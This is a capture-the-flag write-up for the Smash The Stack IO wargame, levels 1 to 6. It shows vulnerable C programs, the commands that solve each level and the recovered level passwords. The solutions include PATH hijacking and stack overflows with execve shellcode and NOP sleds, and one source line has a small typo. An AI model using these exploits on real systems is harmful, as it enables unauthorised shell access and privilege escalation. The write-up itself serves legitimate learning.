# [Smash The Stack(IO)](http://io.smashthestack.org:84/)

## level 1

```
$ ssh level1@io.smashthestack.org
password: level1
```

```
$ objdump -j .text -Sl /levels/level01
8048080:804808068 28 91 04 08          push   $0x8049128
8048085:8048085e8 85 00 00 00          call   804810f <puts>
804808a:804808ae8 10 00 00 00          call   804809f <fscanf>
804808f:804808f3d 0f 01 00 00          cmp    $0x10f,%eax
8048094:80480940f 84 42 00 00 00       je     80480dc <YouWin>
804809a:804809ae8 64 00 00 00          call   8048103 <exit>
```

```
$ /levels/level01
Enter the 3 digit passcode to enter: 271
Congrats you found it, now read the password for level2 from /home/level2/.pass
```

```
$ cat /home/level2/.pass
XNWFtWKWHhaaXoKI
```

## level 2

### level 2

```
$ cat /levels/level02.c
```

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void catcher(int a)
{
    setresuid(geteuid(),geteuid(),geteuid());
    printf("WIN!\n");
    system("/bin/sh");
    exit(0);
}

int main(int argc, char **argv)
{
    puts("source code is available in level02.c\n");

    if (argc != 3 || !a#toi(argv[2]))
        return 1;
    signal(SIGFPE, catcher);
    return abs(atoi(argv[1])) / atoi(argv[2]);
}
```

```
$ /levels/level02 -2147483648 -1
WIN!
```

### level02 alt

```
$ cat /levels/level02.c
```

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define answer 3.141593

void main(int argc, char **argv) {

    float a = (argc - 2)?: strtod(argv[1], 0);

    printf("You provided the number %f which is too ", a);

    if(a < answer)
        puts("low");
    else if(a > answer)
        puts("high");
    else
        execl("/bin/sh", "sh", "-p", NULL);
}
```

```
$ /levels/level02_alt nan
```

```
$ cat /home/level3/.pass
OlhCmdZKbuzqngfz
```

## level 3

```
$ cat /levels/level03.c
```

```cpp
#include <stdio.h>
#include <string.h>

void good()
{
    puts("Win.");
    execl("/bin/sh", "sh", NULL);
}

void bad()
{
    printf("I'm so sorry, you're at %p and you want to be at %p\n", bad, good);
}

int main(int argc, char **argv, char **envp)
{
    void (*functionpointer)(void) = bad;
    char buffer[50];

    if(argc != 2 || strlen(argv[1]) < 4)
        return 0;

    memcpy(buffer, argv[1], strlen(argv[1]));
    memset(buffer, 0, strlen(argv[1]) - 4);

    printf("This is exciting we're going to %p\n", functionpointer);
    functionpointer();

    return 0;
}
```

```
$ /levels/level03 `echo -e "123451234512345123451234512345123451234512345123451234512345123451234512345=\x74"`
This is exciting we're going to 0x8048474
Win.
```

```
$ cat /home/level4/.pass
7WhHa5HWMNRAYl9T
```

## level 4

```
$ cat /levels/level04.c
```

```cpp
#include <stdlib.h>
#include <stdio.h>

int main() {
    char username[1024];
    FILE* f = popen("whoami","r");
    fgets(username, sizeof(username), f);
    printf("Welcome %s", username);

    return 0;
}
```

```
$ mkdir /tmp/ving_dir
$ echo cat /home/level5/.pass >> /tmp/ving_dir/whoami
$ chmod 777 /tmp/ving_dir/whoami

$ PATH="/tmp/ving_dir:$PATH"
```

```
$ /levels/level04
Welcome DNLM3Vu0mZfX0pDd
```

## level 5

```
$ cat /levels/level05.c
```

```cpp
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) {

    char buf[128];

    if(argc < 2) return 1;

    strcpy(buf, argv[1]);

    printf("%s\n", buf);
    return 0;
}
```

```
$ /levels/level05 `python -c 'print "\x90"*88+"\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"+"\x90"*26+"\x70\xfd\xff\xbf"'`
```

```
$ cat /home/level6/.pass
fQ8W8YlSBJBWKV2R
```

## level 6

```
$ cat /levels/level06.c
```

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

enum{
LANG_ENGLISH,
LANG_FRANCAIS,
LANG_DEUTSCH,
};

int language = LANG_ENGLISH;

struct UserRecord{
    char name[40];
    char password[32];
    int id;
};

void greetuser(struct UserRecord user){
    char greeting[64];
    switch(language){
        case LANG_ENGLISH:
            strcpy(greeting, "Hi "); break;
        case LANG_FRANCAIS:
            strcpy(greeting, "Bienvenue "); break;
        case LANG_DEUTSCH:
            strcpy(greeting, "Willkommen "); break;
    }
    strcat(greeting, user.name);
    printf("%s\n", greeting);
}

int main(int argc, char **argv, char **env){
    if(argc != 3) {
        printf("USAGE: %s [name] [password]\n", argv[0]);
        return 1;
    }

    struct UserRecord user = {0};
    strncpy(user.name, argv[1], sizeof(user.name));
    strncpy(user.password, argv[2], sizeof(user.password));

    char *envlang = getenv("LANG");
    if(envlang)
        if(!memcmp(envlang, "fr", 2))
            language = LANG_FRANCAIS;
        else if(!memcmp(envlang, "de", 2))
            language = LANG_DEUTSCH;

    greetuser(user);
}
```

```
$ export LANG=fr
$ export shellcode=`python -c 'print "\x90"*80+"\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"'`
$ /levels/level06 `python -c 'print "ving"*16, "\x90"*26+"\x0c\xff\xff\xbf"'`
```

```
$ cat /home/level7/.pass
U3A6ZtaTub14VmwV
```
